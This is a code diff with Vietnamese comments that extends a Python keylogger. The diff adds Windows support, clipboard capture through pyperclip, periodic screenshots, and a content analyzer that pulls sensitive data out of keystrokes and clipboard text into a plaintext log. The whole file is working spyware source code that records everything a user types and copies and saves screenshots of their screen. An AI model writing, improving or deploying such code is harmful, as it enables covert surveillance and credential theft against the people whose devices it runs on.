@@ -1,19 +1,24 @@
-from pynput import keyboard
-import time
-from datetime import datetime
+import platform
 import os
-import subprocess
-import threading
 import sys
-import signal
-import base64
+import time
+import threading
+import subprocess
+from datetime import datetime
+from pynput import keyboard
+import pyperclip
 from cryptography.fernet import Fernet
 import json
+import base64
 from app_monitor import AppMonitor
+from content_analyzer import ContentAnalyzer
 
 class Keylogger:
     def __init__(self):
-        # Khởi tạo các đường dẫn trong thư mục hiện tại
+        # Xác định hệ điều hành
+        self.is_windows = platform.system() == 'Windows'
+        
+        # Khởi tạo các đường dẫn
         self.log_dir = "logs"
         self.screenshot_dir = os.path.join(self.log_dir, "screenshots")
         self.log_file = os.path.join(self.log_dir, "keylog.txt")
@@ -26,10 +31,11 @@ class Keylogger:
         self.last_clipboard = ""
         self.running = True
         self.key_count = 0
-        self.screenshot_interval = 100  # Số phím trước khi chụp ảnh
+        self.screenshot_interval = 100
         
-        # Khởi tạo AppMonitor
+        # Khởi tạo các module
         self.app_monitor = AppMonitor(self.log_dir)
+        self.content_analyzer = ContentAnalyzer()
         
         # Tạo thư mục log
         self.ensure_log_directory()
@@ -38,9 +44,11 @@ class Keylogger:
         self.init_encryption()
         
         # Đăng ký xử lý tín hiệu
-        signal.signal(signal.SIGINT, self.handle_exit)
-        signal.signal(signal.SIGTERM, self.handle_exit)
-        
+        if not self.is_windows:
+            import signal
+            signal.signal(signal.SIGINT, self.handle_exit)
+            signal.signal(signal.SIGTERM, self.handle_exit)
+
     def init_encryption(self):
         """Khởi tạo hoặc tải key mã hóa"""
         try:
@@ -91,55 +99,47 @@ class Keylogger:
             print(f"Lỗi khi lưu log: {e}")
             
     def take_screenshot(self):
-        """Chụp ảnh màn hình sử dụng scrot"""
+        """Chụp ảnh màn hình"""
         try:
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
             screenshot_path = os.path.join(self.screenshot_dir, f"screenshot_{timestamp}.png")
             
-            # Sử dụng scrot với các tùy chọn để chụp ảnh màn hình
-            process = subprocess.Popen(
-                ['scrot', '-q', '100', '-z', screenshot_path],  # -q: chất lượng, -z: nén
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                env=dict(os.environ, DISPLAY=':0')  # Đảm bảo DISPLAY được set
-            )
-            output, error = process.communicate(timeout=5)  # Thêm timeout 5 giây
-            
-            if process.returncode == 0:
-                if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
-                    print(f"Đã chụp ảnh màn hình: {screenshot_path}")
-                else:
-                    print("Không thể lưu ảnh chụp màn hình")
+            if self.is_windows:
+                # Sử dụng pyautogui cho Windows
+                import pyautogui
+                screenshot = pyautogui.screenshot()
+                screenshot.save(screenshot_path)
             else:
-                error_msg = error.decode() if error else "Không xác định được lỗi"
-                print(f"Lỗi khi chụp ảnh màn hình: {error_msg}")
+                # Sử dụng scrot cho Linux
+                display = os.environ.get('DISPLAY', ':1')
+                process = subprocess.Popen(
+                    ['scrot', '-q', '100', '-z', screenshot_path],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    env=dict(os.environ, DISPLAY=display)
+                )
+                output, error = process.communicate(timeout=5)
                 
-        except subprocess.TimeoutExpired:
-            print("Chụp ảnh màn hình bị timeout")
+                if process.returncode != 0:
+                    error_msg = error.decode() if error else "Không xác định được lỗi"
+                    print(f"Lỗi khi chụp ảnh màn hình: {error_msg}")
+                    return
+            
+            if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
+                print(f"Đã chụp ảnh màn hình: {screenshot_path}")
+            else:
+                print("Không thể lưu ảnh chụp màn hình")
+                
         except Exception as e:
             print(f"Lỗi khi chụp ảnh màn hình: {e}")
-            
+
     def get_clipboard_content(self):
-        """Lấy nội dung clipboard an toàn cho Linux"""
+        """Lấy nội dung clipboard"""
         try:
-            # Thử sử dụng xclip trước
-            process = subprocess.Popen(['xclip', '-selection', 'clipboard', '-o'], 
-                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output, error = process.communicate()
-            if not error:
-                return output.decode('utf-8').strip()
-            
-            # Nếu xclip không hoạt động, thử xsel
-            process = subprocess.Popen(['xsel', '-b'], 
-                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output, error = process.communicate()
-            if not error:
-                return output.decode('utf-8').strip()
-                
-            return ""
+            return pyperclip.paste()
         except Exception:
             return ""
-            
+
     def monitor_clipboard(self):
         """Theo dõi clipboard"""
         while self.running:
@@ -151,17 +151,42 @@ class Keylogger:
                     with open(self.clipboard_file, 'a', encoding='utf-8') as f:
                         f.write(log_data)
                     self.last_clipboard = current_clipboard
+                    self.on_clipboard_change(current_clipboard)
             except Exception as e:
                 print(f"Lỗi khi theo dõi clipboard: {e}")
             time.sleep(1)
-    
+
+    def on_clipboard_change(self, text):
+        """Xử lý khi clipboard thay đổi"""
+        if text:
+            # Mã hóa và lưu nội dung clipboard
+            encrypted_text = self.encrypt_data(text)
+            with open(self.clipboard_file, 'a', encoding='utf-8') as f:
+                f.write(f"{datetime.now()}: {encrypted_text}\n")
+            
+            # Phân tích nội dung clipboard
+            analysis = self.content_analyzer.analyze_clipboard(text)
+            
+            # Kiểm tra thông tin nhạy cảm
+            if analysis['sensitive_data']:
+                self.log_sensitive_data(analysis['sensitive_data'])
+                
+    def log_sensitive_data(self, sensitive_data):
+        """Ghi log thông tin nhạy cảm"""
+        with open('logs/sensitive_data.log', 'a') as f:
+            for item in sensitive_data:
+                f.write(f"{datetime.now()}: {item['type']} - {item['value']}\n")
+                
     def on_key_press(self, key):
+        """Xử lý khi phím được nhấn"""
         try:
-            # Lấy thời gian hiện tại
             timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
             
             # Chuyển đổi key thành chuỗi
-            key_str = str(key).replace("'", "")
+            if hasattr(key, 'char'):
+                key_str = key.char
+            else:
+                key_str = str(key).replace("'", "")
             
             # Ghi log phím được nhấn
             log_data = f'[{timestamp}] Phím được nhấn: {key_str}\n'
@@ -172,36 +197,38 @@ class Keylogger:
             
             # Chụp ảnh màn hình theo khoảng thời gian
             if self.key_count % self.screenshot_interval == 0:
-                # Chạy chụp ảnh trong thread riêng để không block main thread
                 screenshot_thread = threading.Thread(target=self.take_screenshot)
                 screenshot_thread.daemon = True
                 screenshot_thread.start()
                 
         except Exception as e:
             print(f"Lỗi khi ghi log: {e}")
-    
+
     def on_key_release(self, key):
-        # Dừng listener khi nhấn Esc
+        """Xử lý khi phím được thả"""
         if key == keyboard.Key.esc:
             self.running = False
             return False
-    
-    def handle_exit(self, signum, frame):
+
+    def handle_exit(self, signum=None, frame=None):
         """Xử lý khi chương trình bị dừng"""
         print("\nĐang dừng keylogger...")
         self.running = False
         self.cleanup()
         sys.exit(0)
-    
+
     def cleanup(self):
         """Dọn dẹp trước khi thoát"""
         try:
-            duration = time.time() - self.start_time
-            print(f"\nKeylogger đã dừng. Thời gian chạy: {duration:.2f} giây")
+            if self.start_time:
+                duration = time.time() - self.start_time
+                print(f"\nKeylogger đã dừng. Thời gian chạy: {duration:.2f} giây")
+            
             print(f"Log đã được lưu tại: {os.path.abspath(self.log_file)}")
             print(f"Clipboard log đã được lưu tại: {os.path.abspath(self.clipboard_file)}")
             print(f"Ảnh chụp màn hình đã được lưu tại: {os.path.abspath(self.screenshot_dir)}")
             print(f"Log ứng dụng đã được lưu tại: {os.path.abspath(os.path.join(self.log_dir, 'app_usage.enc'))}")
+            
             print("\nĐể giải mã log, chạy các lệnh:")
             print("- python decrypt_log.py (cho keylog)")
             print("- python decrypt_app_log.py (cho app usage)")
@@ -211,8 +238,9 @@ class Keylogger:
             
         except Exception as e:
             print(f"Lỗi khi dọn dẹp: {e}")
-    
+
     def start(self):
+        """Bắt đầu keylogger"""
         print("Keylogger đã bắt đầu. Nhấn 'Esc' để dừng.")
         self.start_time = time.time()
         
@@ -235,6 +263,29 @@ class Keylogger:
             print(f"Lỗi không mong muốn: {e}")
         finally:
             self.cleanup()
+
+    def analyze_current_line(self):
+        """Phân tích dòng hiện tại"""
+        try:
+            # Đọc dòng cuối cùng từ file log
+            with open(self.log_file, 'r') as f:
+                lines = f.readlines()
+                if lines:
+                    last_line = lines[-1].strip()
+                    # Phân tích nội dung
+                    analysis = self.content_analyzer.analyze_text(last_line)
+                    if analysis['sensitive_data']:
+                        self.log_sensitive_data(analysis['sensitive_data'])
+        except:
+            pass
+            
+    def get_analysis_report(self):
+        """Lấy báo cáo phân tích"""
+        return {
+            'keywords': self.content_analyzer.get_keyword_stats(),
+            'sensitive_data': self.content_analyzer.get_sensitive_data_stats(),
+            'clipboard_history': self.content_analyzer.get_clipboard_history()
+        }
 
 if __name__ == "__main__":
     try:
